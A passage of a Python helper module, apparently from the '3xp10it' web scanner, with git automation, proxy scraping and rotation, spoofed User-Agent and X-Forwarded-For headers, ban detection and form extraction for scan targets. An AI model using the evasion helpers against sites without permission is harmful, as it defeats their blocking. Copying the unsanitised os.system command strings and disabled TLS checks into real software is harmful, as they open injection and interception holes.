            "cd %s && git add . && git status && git commit -a -m '%s' && git push -u origin \
master" % (local_resp_path, comment))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is False:
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path\
(>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then\
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * &&  git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
%s && git push -u origin master" % (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is True:
        # 如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件
        # 不一致时,且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的
        # 处理方法,(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),虽然当远程仓库中不
        # 含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path \
(>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cd %s && rm -r .git" % local_resp_path)
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * && git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
%s && git push -u origin master" %
            (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False


def get_os_type():
    # 获取操作系统类型,返回结果为"Windows"或"Linux"
    return platform.system()


def post_request(url, data, verify=True):
    # 发出post请求
    # 第二个参数是要提交的数据,要求为字典格式
    # 返回值为post响应的html正文内容,返回内容为str类型
    # print("当前使用的data:")
    # print(data)
    # 这里的verify=False是为了防止https服务器证书无法通过校验导致无法完成https会话而设置的,并不一定有效,后期可能
    # 要改

    global DELAY
    if DELAY!="":
        import time
        time.sleep(DELAY)
    else:
        pass

    import mechanicalsoup
    browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
    ua = get_random_ua()
    browser.session.headers.update({'User-Agent': '%s' % ua})
    x_forwarded_for = get_random_x_forwarded_for()
    browser.session.headers.update({'X-Forwarded-For': '%s' % x_forwarded_for})

    if verify == False:
        page = browser.post(url, data=data, timeout=10, verify=False)
    if verify == True:
        page = browser.post(url, data=data, timeout=10)
    content = page.content
    import chardet
    bytesEncoding = chardet.detect(content)['encoding']
    return content.decode(encoding=bytesEncoding, errors="ignore")


def get_random_ua():
    # 得到随机user-agent值
    import os
    if os.path.exists("dicts/user-agent.txt"):
        f = open(ModulePath + "dicts/user-agents.txt", "r+")
        all_user_agents = f.readlines()
        f.close()
    else:
        all_user_agents = [
            "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
            "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
            "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
            "Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
            "Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
            "Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
        ]
    random_ua_index = random.randint(0, len(all_user_agents) - 1)
    ua = re.sub(r"(\s)$", "", all_user_agents[random_ua_index])
    return ua


def get_random_x_forwarded_for():
    # 得到随机x-forwarded-for值
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(range(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)


def get_random_header():
    headers = {"User-Agent": get_random_ua(),
               "Accept": "*/*",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               #"X-Requested-With": "XMLHttpRequest",
               "Connection": "keep-alive"
               }
    return headers


# 下面主要用于获取代理get_one_useful_proxy(),返回0则获取失败


# 代理验证,proxies() #传入一个字典
def proxies(urls={"http": "http://124.240.187.78:81"}):
    proxies = urls
    # timeout=60 设置超时时间60秒
    # res.status_code 查看返回网页状态码
    # verify = False 忽略证书
    try:
        res = requests.get(url="http://1212.ip138.com/ic.asp", proxies=proxies,
                           verify=False, timeout=60, headers=get_random_header())
        # print u"访问畅通!!!"
        # print res.content
        if res.status_code == 200:
            # print u"代理可用!"
            # print res.content
            # with open("1.txt",'wb') as f:
            # f.write(res.content)

            # print(urls)
            # print(u"访问没有问题,返回1")
            return proxies
        else:
            # print(urls)
            # print(u"访问不可用,返回0")
            return False
    except Exception as err:
        print(urls)
        print(err)
        print(u"访问异常,返回0")
        print("正在获取10个代理中,请耐心等待...")
        return False

    # 获取列表页数 并 生成列表超链接


def get_list_page(listurl="http://www.xicidaili.com/nt/"):
    # 获取列表页数
    import re
    doc = requests.get(url=listurl, headers=get_random_header()).text
    soup = BeautifulSoup(doc, 'lxml')
    page_html = soup.find("div", class_="pagination")
    page_list = re.findall(r"\d+", str(page_html))
    if page_list == []:
        return 0
    page_max = int(page_list[-2])
    # 生成列表超链接
    list_all = []
    import re
    for i in range(1, page_max + 1):
        url = re.sub('/\d+', '/%d' % i, listurl + "1", re.S)
        # print url
        list_all.append(url)
    else:
        # print list_all
        return list_all

# 抓取页面字段


def page_data(url="http://www.xicidaili.com/nn/1"):
    resule = []
    html = requests.get(url, headers=get_random_header()).text
    soup = BeautifulSoup(html, 'lxml')
    table = soup.select('table tr')
    for tr in table:
        # print tr
        td = tr.select('td')
        iplist = []
        for ip in td:
            # print ip.string
            iplist.append(ip.string)
        # print iplist
        if iplist:
            resule.append(iplist[5].lower() + ':' + iplist[5].lower() +
                          '://' + iplist[1] + ':' + iplist[2])
    return resule
    # 获取数据

# 追加保存数据


def save_ip(ip):
    with open('proxy.txt', 'a') as f:
        f.write(ip + "\n")


def check_banned(url):
    # 检测当前ip是否被拉黑
    result = get_request(url, by="MechanicalSoup")
    if result['code'] != 0:
        return False
    else:
        result = get_request(
            url, proxyUrl=get_one_useful_proxy(), by="MechanicalSoup")
        if result['code'] != 0:
            return True
        else:
            result = get_request(
                url, proxyUrl=get_one_useful_proxy(), by="MechanicalSoup")
            if result['code'] != 0:
                return True
            else:
                return False


def get_proxy_list():
    # 尝试一直获取并初步验证代理,直到得到10个代理
    from bs4 import BeautifulSoup
    import sys
    import requests
    import lxml
    import re
    import time

    print(
        "如果是第一次获取代理[也即同目录下没有proxy.txt,或者同目录下有proxy.txt但是该文件的时限超过了3天]请耐心等待,现在尝试获取10个代理,一般花费5分钟左右,你可以去喝杯咖啡")
    list_url = get_list_page(listurl="http://www.xicidaili.com/nt/")
    if list_url == 0:
        return 0
    startTime = time.time()
    for url in list_url:
        iplist = page_data(url)
        for ip in iplist:
            arr = re.split(':', ip)
            # print type(arr),arr,arr[0],arr[1],arr[2],arr[3]
            parame = {arr[0]: arr[1] + ':' + arr[2] + ':' + arr[3]}
            res = proxies(parame)
            if res:
                # print u"file_put" #写入文件
                save_ip(str(arr[1] + ':' + arr[2] + ':' + arr[3]))
                with open("proxy.txt", "r+") as f:
                    gotList = f.readlines()
                if len(gotList) < 10:
                    # 只获取10个代理,获取所有代理要花很多时间
                    continue
                else:
                    spendTime = time.time() - startTime
                    print("获取10个代理花费时间:%s" % seconds2hms(spendTime))
                    return

            else:
                # 访问不可用时走这里的流程
                pass


def check_proxy_and_rewrite_thread(parame):
    res = proxies(parame)
    if res:
        for key in parame:
            print("parame[key] is:")
            print(parame[key])
            save_ip(parame[key])
    else:
        pass


def get_one_proxy():
    from concurrent import futures
    import random
    import os
    import re
    proxyCount = 0
    proxyList = []
    if os.path.exists("proxy.txt"):
        if fileOutofDate("proxy.txt"):
            os.system("rm proxy.txt")
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0

        with open("proxy.txt") as f:
            for eachLine in f:
                eachLine = re.sub(r"\s$", "", eachLine)
                proxyCount += 1
                proxyList.append(eachLine)

        if proxyCount > 10:
            pass
        else:
            # 小于10个代理则重新获取
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0

    else:
        a = get_proxy_list()
        if a == 0:
            print("try to get proxy ip list,but the server blocked it")
            return 0

    finalList = []
    with open("proxy.txt", "r+") as f:
        for eachLine in f:
            eachLine = re.sub(r"\s$", "", eachLine)
            finalList.append(eachLine)
    return_value = random.choice(finalList)
    return return_value


def get_one_useful_proxy():
    # 相比get_one_proxy函数,这个函数得到的是经过验证的有效的代理
    tryProxyCount = 0
    while 1:
        proxyIp = get_one_proxy()
        tryProxyCount += 1
        if tryProxyCount > 10:
            # 随便10个代理都没用时重新获取代理列表
            a = get_proxy_list()
            if a == 0:
                print("try to get proxy ip list,but the server blocked it")
                return 0
            tryProxyCount = 0
            continue

        if proxyIp == 0:
            print("大爷,不要用代理了,获取代理列表失败了")
            return 0
        else:
            parameFirstPart = proxyIp.split(":")[0]
            parameSecondPart = proxyIp
            parame = {parameFirstPart: parameSecondPart}
            if proxies(parame):
                print("恭喜大爷,得到的有效的代理:" + proxyIp)
                return proxyIp
            else:
                continue

def get_param_list_from_param_part(param_part):
    # eg. get ['a','b'] from 'a=1&b=2'
    param_part_list=param_part.split("&")
    return_list=[]
    for each in param_part_list:
        return_list.append(each.split("=")[0])
    return return_list 



def get_param_part_from_content(content):
    form_part_value=re.search(r'''<form[^<>]+>(((?!=</form>)[\s\S])+)</form>''',content,re.I).group(1)
    inputParamList=re.findall(r'''(<[^<>]+\s+name\s*=\s*['"]?([^\s'"]+)['"]?[^<>]*>)''',form_part_value,re.I)
    paramPartValue = ""
    paramNameList = []
    for each in inputParamList:
        paramName = each[-1]
        if paramName not in paramNameList:
            # 防止有重复的参数
            paramNameList.append(paramName)

            existDefaultValue=re.search(r'''value=('|")?([^'"<>]*)('|")?''', each[0], re.I)
            if existDefaultValue:
                #如果有默认值
                defaultValue=existDefaultValue.group(2)
                defaultValue=re.sub(r"\s+","+",defaultValue)
                paramPartValue += (paramName +"=" + defaultValue + "&")
            else:
                # 如果没有默认值
                if re.search(r'''required=('|")?required('|")?''', each[0], re.I):
                    # 处理必须要填的参数
                    paramPartValue += (paramName +"=requiredParamValue&")
                else:
                    paramPartValue += (paramName + "=&")

    if paramPartValue!="" and paramPartValue[-1] == "&":
        paramPartValue = paramPartValue[:-1]
    return paramPartValue



# 上面主要用于获取代理，用法为get_one_useful_proxy(),返回0则获取失败


def test_speed(address):
    # test ping speed
    a=get_string_from_command("ping %s -c 15" % address)
    all=re.findall(r"time=(\S+)",a,re.I)
    if len(all)<12:
        print("error")
        return
    sum=0
    i=0
    for each in all:
        i+=1
        if i<=12:
            sum+=float(each)
    print("ping speed time:\n%s,%s" % (address,str(sum/10)))
    return sum/12


    
def get_request(url, by="MechanicalSoup", proxyUrl="", cookie="", delaySwitcher=1):
    # 如果用在爬虫或其他需要页面执行js的场合,用by="seleniumPhantomJS",此外用by="MechanicalSoup"
    # 因为by="seleniumPhantomJS"无法得到http的响应的code(状态码)
    # 如果用selenium,用firefox打开可直接访问,要是用ie或chrome打开则要先安装相应浏览器驱动
    # 默认用MechanicalSoup方式访问url
    # 发出get请求,返回值为一个字典,有5个键值对
    # eg.{"code":200,"title":None,"content":"",'hasFormAction',"",'formActionValue':""}
    # code是int类型
    # title如果没有则返回None,有则返回str类型
    # content如果没有则返回""
    # hasFormAction的值为True或False,True代表url对应的html中有表单可提交
    # formActionValue的值为hasFormAction为True时要测试的url
    # formActionValue is not from the value in "<form action="valuePart">"
    # formActionValue is the final request url the browser should make to the server
    # 如http://www.baidu.com/1.php^a=1&b=2 (post提交表单类型的测试url)
    # 如http://www.baidu.com/1.php?a=1&b=2 (get提交表单类型的测试url)
    # by是使用方法,有两种:MechanicalSoup|chromedriver
    # https://github.com/hickford/MechanicalSoup
    # selenium+chromedriver,chromedriver不能得到code,默认用MechanicalSoup方法
    # delaySwitcher用于设置当前调用get_request函数时是否要按照延时设置来延时,如果设置为0则不需要延时,这种情况用于
    # 一些不担心被服务器禁止访问的场合
    # current_url is the true url the browser is visiting.
    # if redirect exist,returnCurrentUrl is not url
    # if no redirect exist,returnCurrentUrl is url
    # 其中selenium设置phantomjs的cookie的正确方法为
    # https://stackoverflow.com/questions/35666067/selenium-phantomjs-custom-headers-in-python

    # 这里的delay用于所有用到get_request函数的http请求的时间隔,eg:在3xp10it扫描工具的爬虫模块中用到这里

    global DELAY
    if delaySwitcher == 1:
        # 如果打开了delay开关则需要根据配置文件中的delay参数来延时访问
        if DELAY!="":
            import time
            time.sleep(DELAY)
        else:
            pass


    code = None
    title = None
    content = None
    hasFormAction = False
    formActionValue = ""
    current_url=url


    if by == "seleniumPhantomJS":

        if module_exist("selenium") is False:
            os.system("pip3 install selenium")
        from selenium import webdriver
        from selenium.common.exceptions import TimeoutException
        result = get_string_from_command("phantomjs --help")
        if re.search(r"(not found)|(不是内部或外部命令)|(Unknown command)", result,re.I):
            if SystemPlatform == "Darwin":
                os.system("brew install phantomjs")
            elif SystemPlatform == 'Linux':
                os.system("apt-get install phantomjs")
            elif SystemPlatform == 'Windows':
                import wget
                try:
                    wget.download(
                        "https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-windows.zip", out="phantomjs.zip")
                except:
                    print(
                        "Please download phantomjs from the official site and add the executeable file to your path")
                    input("下载速度太慢,还是手工用迅雷下载吧,下载后将可执行文件phantomjs.exe存放到PATH中,再按任意键继续...")
        import time

        if proxyUrl == "" or proxyUrl == 0:
            service_args_value = ['--ignore-ssl-errors=true',
                                  '--ssl-protocol=any', '--web-security=false']
        if proxyUrl != "" and proxyUrl != 0:
            proxyType = proxyUrl.split(":")[0]
            proxyValueWithType = proxyUrl.split("/")[-1]
            service_args_value = ['--ignore-ssl-errors=true', '--ssl-protocol=any', '--web-security=false',
                                  '--proxy=%s' % proxyValueWithType, '--proxy-type=%s' % proxyType]
            service_args_value.append('--load-images=no')  ##关闭图片加载
            service_args_value.append('--disk-cache=yes')  ##开启缓存

        try:
            from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
            dcap = dict(DesiredCapabilities.PHANTOMJS)

            ua = "Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0"
            #headers = {'User-Agent': '%s' % get_random_ua(),'Cookie': '%s' % cookie}
            if cookie!="":
                headers = {'User-Agent': '%s' % ua,'Cookie': '%s' % cookie,'Referer': '%s' %
                        get_http_domain_from_url(url)}
            else:
                headers = {'User-Agent': '%s' % ua,'Referer': '%s' % get_http_domain_from_url(url)}
            for key in headers:
                capability_key = 'phantomjs.page.customHeaders.{}'.format(key)
                webdriver.DesiredCapabilities.PHANTOMJS[capability_key] = headers[key]
            driver = webdriver.PhantomJS(service_args=service_args_value)

            #driver.implicitly_wait(20)
            #driver.set_page_load_timeout(20)

            driver.get(url)

            import random
            # driver.get_screenshot_as_file("/tmp/PhantomJSPic" +
            # get_http_domain_from_url(url).split("/")[-1] + str(random.random()))
            # selenium无法得到code,先根据返回titile和内容来看如果是正常返回,则这里将code赋值为200
            # 如果title和内容异常(如包含"页面不存在"),则将这个请求重新发给get_request(url,by="MechanicalSoup")
            # 这里将正常的http网页用phantomJS来请求,如果发现异常则交给MechanicalSoup重新访问
            code = 200
            title = driver.title
            print(title)
            content = driver.page_source
            #returnCurrentUrl is the true url the browser is visiting.
            # if redirect exist,returnCurrentUrl is not url
            # if no redirect exist,returnCurrentUrl is url
            current_url=driver.current_url
            # 表单页面处理
            try:
                form = driver.find_element_by_css_selector('form').submit()
                hasFormAction = True
                if re.search(r'''<form[^<>]*method=('|")?get('|")?[^<>]*>''', content, re.I):
                    # 说明是get请求提交的参数
                    # get提交表单的处理
                    formActionValue = driver.current_url
                else:
                    if re.search(r'''<form[^<>]*method=('|")?post('|")?[^<>]*>''', content, re.I):
                        # post提交表单的处理采用自行查找所有表单中的参数
                        # post的测试url中有^,这是人为添加的,便于放到数据库中
                        formActionValue += (driver.current_url + "^")
                    
                    else:
                        # 其他情况当作get请求,并用正则找出表单中的参数(不用selenium的submit)
                        formActionValue += (driver.current_url + "?")

                    pureContent=re.sub(r"<!--.*-->","",content)
                    paramPartValue=get_param_part_from_content(pureContent)
                    formActionValue += paramPartValue

            except selenium.common.exceptions.NoSuchElementException:
                hasFormAction = False
                #print("没找到表单...")
            #print("len content is :\n" + str(len(content)))
            print("[title:" + title+"]"+url)

        except Exception as e:
            print(e)
        finally:
            driver.quit()

        if content is None or title is None or (re.search(r"(页面不存在)|(未找到页面)|(page\s+not\s+found)|(404\s+not\s+found)", content, re.I)
        and len(content)<10000) or re.search(r"404", title, re.I):
            if content and re.search(r'''<form\s+[^<>]*>''', content, re.I):
                input("需要调整代码!!!!!!!!!")
            return get_request(url,by="MechanicalSoup",proxyUrl=proxyUrl,cookie=cookie,delaySwitcher=delaySwitcher)


        return {
            'code': code,
            'title': title,
            # 下面比较特殊,PhantomJS得到的html不用decode,直接就是string类型
            'content': content,
            #True or False
            'hasFormAction': hasFormAction,
            # eg,https://www.baidu.com^a=1&b=2
            # eg,https://www.baidu.com/?a=1&b=2
            # 上面?表示formAction对应get请求,^表示formAction对应post请求
            'formActionValue': formActionValue,
            'currentUrl':current_url}


    else:
        import mechanicalsoup

        try:
            browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
            #ua = get_random_ua()
            ua = "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)"
            browser.session.headers.update({'User-Agent': '%s' % ua})
            browser.session.headers.update({'Referer': '%s' % get_http_domain_from_url(url)})

            #headers=browser.session.headers
            #if 'Cookie' in headers:
            #    originalCookie=headers['Cookie']
            #    print(orinalCookie)

            if cookie == "":
                # 调用当前函数时没有传入cookie
                pass
            else:
                # 调用当前函数时传入了cookie参数则更新cookie
                browser.session.headers.update({'Cookie': '%s' % cookie})

            x_forwarded_for = get_random_x_forwarded_for()
            browser.session.headers.update(
                {'X-Forwarded-For': '%s' % x_forwarded_for})

            # 添加verify=False用于访问形如https://forum.90sec.org等服务器公钥没有通过验证的url的访问
            result = browser.get(url,
                                 timeout=10, verify=False)
            if url!=result.url:
                #redirect url
                current_url=result.url
            current_url=result.url
            code = result.status_code
            # content是bytes类型
            content = result.content
            import chardet
            bytesEncoding = chardet.detect(content)['encoding']
            # 使用检测出来的编码方式解码
            #content = content.decode(bytesEncoding)
            content=content.decode(encoding=bytesEncoding, errors="ignore")
            title = BeautifulSoup(content, "lxml").title
            if title is not None:
                title_value = title.string
            else:
                title_value = None

            # 看看有没有表单
            a = re.search(
                r'''<form[^<>]*action=('|")?([^\s'"<>]+)('|")?[^<>]*>''', content, re.I)
            if not a and re.search(r'''<form\s+((?!action|>|<).)*>''', content, re.I):
                # 有form没有action则调用seleniumPhantomJS来重新发送get请求,因为这种情况无法获得表单要提交的url
                return get_request(url,by="seleniumPhantomJS",proxyUrl=proxyUrl,cookie=cookie,delaySwitcher=delaySwitcher)
            if a:
                pureActionValue = a.group(2)
                if  pureActionValue[0]=='/':
                    pureActionValue=get_http_netloc_from_url(current_url)+pureActionValue
                elif re.match(r"http(s)?://.*",pureActionValue,re.I):
                    pureActionValue=pureActionValue
                elif re.match(r"#+",pureActionValue) or re.match(r"\s*",pureActionValue):
                    pureActionValue=current_url
                else:
                    pureActionValue=get_value_from_url(current_url)['y2']+"/"+pureActionValue

                # 有表单
                hasFormAction = True
                pureContent=re.sub(r"<!--.*-->","",content)
                paramPartValue=get_param_part_from_content(pureContent)
                if re.search(r'''<form[^<>]*method=('|")?get('|")?[^<>]*>''', content, re.I):
                    # get提交表单的处理
                    formActionValue += pureActionValue + "?" + paramPartValue
                elif re.search(r'''<form[^<>]*method=('|")?post('|")?[^<>]*>''', content, re.I):
                    # post提交表单的处理采用自行查找所有表单中的参数
                    # post的测试url中有^,这是人为添加的,便于放到数据库中
                    formActionValue += pureActionValue + "^" + paramPartValue
                else:
                    # 对于非get或post的表单默认用get来提交(一般是js提交)
                    formActionValue += pureActionValue + "?" + paramPartValue

        except:
            # 请求次数过多时被目标服务器禁止访问时
            code = 0
            title_value = "页面载入出错,但是这个页面有可能是存在的,只是因为访问过多被暂时拒绝访问,如果当前url是https的,也有可能是代码没有处理好ssl的证书问题"
            content = 'can not get html content this time,may be blocked by the server to request'


        return_value = {
            'code': code,
            'title': title_value,
            'content': content,
            'hasFormAction': hasFormAction,
            'formActionValue': formActionValue,
            'currentUrl':current_url}
        return return_value

def check_start_time(want_time):
    #eg:a="11:59:59"
    import time
    while True:
        a=time.strftime('%H:%M:%S',time.localtime(time.time()))
        print(a)
        if  (a[0:2]==want_time[0:2] and a[3:5]==want_time[3:5] and a[6:8]==want_time[6:8]): 
            break
        else:
            print("还没到点...")
            time.sleep(0.5)
            continue
    time.sleep(0.7)
    a=time.strftime('%H:%M:%S',time.localtime(time.time()))
    print("到点,现在时刻:%s" % a)


def send_http_package(string,http_or_https):
    # 发http请求包封装函数,string可以是burpsuite等截包工具中拦截到的包
    # string要求是burpsuite中抓包抓到的字符串
    # 返回的内容为html
    string=re.sub(r"^\s","",string)
    uri_line=re.search(r"(^.+)",string).group(1)
    header_dict={}
    header_list=re.findall(r"([^:\s]+): (.+)\n",string)
    for each in header_list:
        header_dict[each[0]]=each[1]
    url=http_or_https+"://"+re.search(r"Host: (.+)",string,re.I).group(1)+re.search(r" (\S+)",uri_line,re.I).group(1)
    if string[:3]=="GET":
        res=requests.get(url,headers=header_dict)
        html=res.text
    elif string[:4]=="POST":
        post_string=re.search(r"\n\n(.+)",string).group(1)
        post_string_bytes=post_string.encode("utf8")
        res=requests.post(url,headers=header_dict,data=post_string_bytes)
        html=res.text
    return html



def keep_session(url, cookie):
    # 保持服务器上的session长久有效
    import time
    while 1:
        get_request(url, cookie=cookie, by="MechanicalSoup")
        time.sleep(60)


def get_urls_from_file(file):
    # 从文件中获取所有url
    f = open(file, "r+")
    content = f.read()
    f.close()
    allurls = []
    all = re.findall('(http(\S)+)', content, re.I)
    for each in all:
        allurls.append(each[0])
    return allurls


def get_title_from_file(file):
    # 等到文件中的所有url对应的title
    target_allurls = get_urls_from_file(file)
    print("a output file:/tmp/result.txt")
    writed_urls = []
    for each in target_allurls:
        f = open("/tmp/result.txt", "a+")
        tmp = urlparse(each)
        http_domain = tmp.scheme + '://' + tmp.hostname
        title = get_request(http_domain)['title']
        time.sleep(1)
        try:
            if http_domain not in writed_urls:
                each_line_to_write = http_domain + '\r\n' + 'upon url is:' + title + '\r\n'
                print(each_line_to_write)
                f.write(each_line_to_write)
                writed_urls.append(http_domain)
        except:
            pass
    f.close()


def check_file_has_logo(file_abs_path):
    a = '### blog: http://3xp10it.cc'
    if not os.path.exists(file_abs_path):
        return False
    with open(file_abs_path, 'r') as foo:
        content = foo.readlines()
    for line in content:
        if a in line:
            return True
    return False


def write_code_header_to_file(file_abs_path, function, date, author, blog):
    f = open(file_abs_path, "a+")
    first_line = "#############################################################\n"
    f.write(first_line)
    f.close()
    figlet2file("3xp10it", file_abs_path, False)
    f = open(file_abs_path, "r+")
    all = f.readlines()
    f.close()
    f = open("/tmp/1", "a+")
    for each in all:
        if(each[0:40] != "#" * 40):
            f.write("### " + each)
        else:
            f.write(each)
    f.close()
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    # os.system("cat %s" % file_abs_path)

    f = open(file_abs_path, "a+")
    filename = os.path.basename(file_abs_path)

    f.write("###                                                          \n")
    f.write("### name: %s" % filename + '\n')
    f.write("### function: %s" % function + '\n')
    f.write("### date: %s" % str(date) + '\n')
    f.write("### author: %s" % author + '\n')
    f.write("### blog: %s" % blog + '\n')
    f.write("#############################################################\n")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import figlet2file\nfiglet2file("3xp10it",\
0,True)\ntime.sleep(1)\n\n''')
    f.close()


def insert_code_header_to_file(file_abs_path, function, date, author, blog):
    all_lines = []
    f = open(file_abs_path, "a+")
    all_lines = f.readlines()
    f.close()
    write_code_header_to_file("/tmp/2", function, date, author, blog)
    f = open("/tmp/2", "a+")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import figlet2file\nfiglet2file("3xp10it",\
0,True)\ntime.sleep(1)\n\n''')
    for each in all_lines:
        f.write(each)
    f.close()
    os.system("cat /tmp/2 > %s && rm /tmp/2" % file_abs_path)
    filename = os.path.basename(file_abs_path)
    os.system(
        "sed -i 's/### name: %s/### name: %s/g' %s" %
        ('2', filename, file_abs_path))


def newscript():
    # 快速写脚本,加logo,写完后可选上传到github
    figlet2file("3xp10it", "/tmp/figletpic", True)
    time.sleep(1)
    while 1:
        print("1>write a new script")
        print("2>open and edit a exist script")
        print("your chioce:1/2 default[1]:>", end='')
        tmp = input()
        if(tmp != str(2)):
            print("please input your file_abs_path:>", end='')
            file_abs_path = input()
            if(os.path.exists(file_abs_path)):
                print(
                    "file name exists,u need to change the file name,or if you really want the name,it will \
replace the original file!!!")
                print(
                    "replace the original file? Or you want to edit(e/E for edit) the file direcly?")
                print(" y/n/e[N]:>", end=' ')
                choose = input()
                if(choose != 'y' and choose != 'Y' and choose != 'e' and choose != 'E'):
                    continue
                elif(choose == 'y' or choose == 'Y'):
                    os.system("rm %s" % file_abs_path)
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    if not check_file_has_logo(file_abs_path):
                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                    break
            print("please input the script function:)")
            function = input()
            date = datetime.date.today()
            author = "quanyechavshuo"
            blog = "http://3xp10it.cc"
            if not check_file_has_logo(file_abs_path) and os.path.basename(
                    file_abs_path) != "newscript.py" and "exp10it.py" != os.path.basename(file_abs_path):
                insert_code_header_to_file(
                    file_abs_path, function, date, author, blog)
            break
        else:
            print("please input your file_abs_path to edit:>", end=' ')
            file_abs_path = input()
            if os.path.exists(file_abs_path) is False:
                print(
                    "file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:>",
                    end=' ')
                choose = input()
                if choose == 'y' or choose == 'Y':
                    if("exp10it.py" != os.path.basename(file_abs_path)):
                        print("please input the script function:)")
                        function = input()
                        date = datetime.date.today()
                        author = "quanyechavshuo"
                        blog = "http://3xp10it.cc"

                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                        break
                    else:
                        print(
                            "warning! you are edit a new file named 'exp10it',this is special,you know it's \
your python module's name,so I will exit:)")

                else:
                    continue
            else:
                if(not check_file_has_logo(file_abs_path) and "exp10it.py" != os.path.basename(file_abs_path) and "newscript.py" != os.path.basename(file_abs_path)):
                    print("please input the script function:)")

                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    insert_code_header_to_file(
                        file_abs_path, function, date, author, blog)
                    break
                else:
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    break

    os.system("vim %s" % file_abs_path)
    print("do you want this script upload to github server? Y/n[Y]:")
    choose = input()
    if choose != 'n':
        print("please input your remote repository name:)")
        repo_name = input()
        succeed = save2github(file_abs_path, repo_name, function)
        if(succeed):
            print("all is done and all is well!!!")
        else:
            print(
                "save2github wrong,check it,maybe your remote repository name input wrong...")


def blog():
    # 便捷写博客(jekyll+github)函数
    if SystemPlatform == "Windows":
        print("Sorry,current function 'def blog():' does not support windows")
        return
    if SystemPlatform == "Darwin":
        a = get_string_from_command("gsed")
        if re.search(r"command not found", a, re.I):
            print("Please install gnu-sed,eg.brew install gnu-sed")
    date = datetime.date.today()
    print("please input blog article title:)")
    title = input()
    print("please input blog categories:)")
    categories = input()
    print("please input blog tags,use space to separate:)")
    tags = input()
    tags_list = tags.split(' ')
    tags_write_to_file = ""
    for each in tags_list:
        tags_write_to_file += (' - ' + each + '\\\n')
    tags_write_to_file = tags_write_to_file[:-2]

    article_title = title
